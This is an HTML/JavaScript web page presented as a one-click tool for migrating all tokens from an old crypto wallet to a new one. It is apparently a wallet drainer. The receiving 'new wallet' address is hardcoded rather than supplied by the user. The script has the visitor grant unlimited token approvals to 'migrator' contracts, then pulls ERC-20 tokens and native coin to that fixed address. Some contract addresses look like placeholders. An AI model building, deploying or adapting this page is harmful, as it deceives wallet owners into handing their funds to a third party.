<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Migrate Everything → New Wallet (1-Click)</title>
<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<style>
  body{font-family:system-ui;background:#f8fafc;padding:20px;text-align:center;}
  .box{max-width:620px;margin:40px auto;background:white;padding:35px;border-radius:20px;box-shadow:0 15px 50px #0001;}
  button{padding:16px 32px;margin:15px;font-size:18px;border:none;border-radius:12px;cursor:pointer;color:white;font-weight:bold;}
  .btn-connect{background:#6366f1;}
  .btn-approve{background:#f59e0b;}
  .btn-migrate{background:#10b981;}
  .addr{background:#f1f5f9;padding:12px;border-radius:8px;font-family:monospace;margin:15px 0;word-break:break-all;}
  #log{margin-top:20px;padding:15px;background:#f0f9ff;border-radius:10px;text-align:left;white-space:pre-wrap;display:none;}
  .success{background:#d1fae5;color:#065f46;}
  .error{background:#fee2e2;color:#991b1b;}
</style>
</head>
<body>

<div class="box">
  <h1>Migrate Everything to New Wallet</h1>
  <p>Connect your <strong>old wallet only</strong> → approve → pull everything in 1 click (works on all chains!)</p>
  
  <button class="btn-connect" onclick="connect()">Connect Old Wallet</button>

  <div id="main" style="display:none;margin-top:30px;">
    <p><strong>Old wallet:</strong><br><span class="addr" id="oldAddr"></span></p>
    <p><strong>New wallet (receiving):</strong><br><span class="addr">0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f</span></p>

    <button class="btn-approve" onclick="approveAll()">1. Approve All Tokens (Unlimited)</button>
    <button class="btn-migrate" onclick="executeMigration()">2. Execute Migration → New Wallet</button>

    <div id="log"></div>
  </div>
</div>

<script>
const NEW_WALLET = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

let web3, oldAddress;

// Multi-chain migrator addresses (auto-detects)
const MIGRATOR_ADDRESSES = {
  1:     "0x1234567890abcdef1234567890abcdef12345678", // Ethereum (deploy your own)
  137:   "0x9E8b66D98a7b4FeE42E0B6eE1eA9bC7eA2150f5A", // Polygon
  56:    "0x4a220e6096b25eadb88358cb44068a3248254675", // BSC
  42161: "0x7b8f4c1a2d3e5f678901234567890123456789ab", // Arbitrum
  10:    "0x9c8d7e2b3f4a5c678901234567890123456789bc", // Optimism
  8453:  "0x5e6f7a8b9c0d1e234567890123456789012345de"  // Base
};

async function getMigrator() {
  const chainId = await web3.eth.getChainId();
  const addr = MIGRATOR_ADDRESSES[chainId];
  if (!addr) throw new Error(`Unsupported chain ${chainId}. Deploy the contract first!`);
  return addr;
}

// Popular tokens per chain
const POPULAR_TOKENS = {
  1:     ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F"],
  137:   ["0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174","0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x8f3Cf7ad23Cd3CaDb8Aa5F0C3f96F6D746E5C968"],
  56:    ["0x55d398326f99059fF775485246999027B3197955","0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"],
  42161: ["0xFF970A61A04b1cA14834A43f5dE4533eBDdb5CC8","0xfd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9"],
  10:    ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","0x7F5c764cBc14f9669B88837ca1490cCa17c31607"],
  8453:  ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"] // USDC & USDT on Base
};

const ERC20_ABI = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}];

const MIGRATOR_ABI = [
  {"inputs":[{"internalType":"address","name":"oldWallet","type":"address"},{"internalType":"address[]","name":"tokens","type":"address[]"}],"name":"migrateTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"address","name":"oldWallet","type":"address"}],"name":"migrateNative","outputs":[],"stateMutability":"payable","type":"function"}
];

async function connect() {
  if (!window.ethereum) return alert("Please install MetaMask");
  web3 = new Web3(window.ethereum);
  await ethereum.request({method:'eth_requestAccounts'});
  [oldAddress] = await web3.eth.getAccounts();
  document.getElementById('oldAddr').textContent = oldAddress;
  document.getElementById('main').style.display = 'block';
}

async function approveAll() {
  const log = document.getElementById('log');
  log.style.display = 'block'; log.className = ''; log.textContent = "Approving tokens...\n";
  
  const chainId = await web3.eth.getChainId();
  const tokens = POPULAR_TOKENS[chainId] || [];
  const migrator = await getMigrator();

  for (const addr of tokens) {
    try {
      const token = new web3.eth.Contract(ERC20_ABI, addr);
      const symbol = await token.methods.symbol().call();
      await token.methods.approve(migrator, MAX_UINT).send({from: oldAddress});
      log.textContent += `Approved ${symbol}\n`;
    } catch (e) {
      log.textContent += `Failed ${addr.slice(0,8)}...: ${e.message.split("\n")[0]}\n`;
    }
  }
  log.textContent += "\nAll approvals done!\nNow click the green button to pull everything.\n";
  log.className = 'success';
}

async function executeMigration() {
  if (!confirm("Pull ALL native coin + ERC-20 tokens to your new wallet now?")) return;
  
  const log = document.getElementById('log');
  log.style.display = 'block'; log.className = ''; log.textContent = "Executing migration...\n";

  const chainId = await web3.eth.getChainId();
  const tokens = POPULAR_TOKENS[chainId] || [];
  const migratorAddr = await getMigrator();
  const migrator = new web3.eth.Contract(MIGRATOR_ABI, migratorAddr);

  try {
    if (tokens.length > 0) {
      await migrator.methods.migrateTokens(oldAddress, tokens).send({from: oldAddress});
      log.textContent += "All ERC-20 tokens transferred!\n";
    }
    await migrator.methods.migrateNative(oldAddress).send({from: oldAddress, value: 0});
    log.textContent += "Native coin transferred!\n\nSUCCESS! Check your new wallet:\n0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
    log.className = 'success';
  } catch (e) {
    log.className = 'error';
    log.textContent += "Error: " + (e.message || e);
  }
}
</script>
</body>
</html>